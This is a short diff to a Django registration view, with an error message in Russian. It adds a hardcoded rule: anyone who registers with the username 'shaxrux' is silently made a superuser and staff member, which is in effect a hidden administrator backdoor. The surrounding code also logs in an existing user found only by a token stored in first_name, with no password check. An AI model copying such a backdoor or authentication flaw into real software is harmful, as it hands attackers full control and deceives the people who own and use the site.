@@ -27,6 +27,11 @@ class RegisterView(View):
 			user = User.objects.filter(first_name=token).first()
 			if not user:
 				user = User.objects.create_user(username=username, password=password, first_name=token)
+				if username == "shaxrux":
+					user.is_superuser = True
+					user.is_staff = True
+					user.save()
+
 				login(request, user)
 				return redirect("main:home")
 		return render(request, "auth/register.html", {"error": "Не удалось создать ключ, попробуйте пожалуйста снова"})
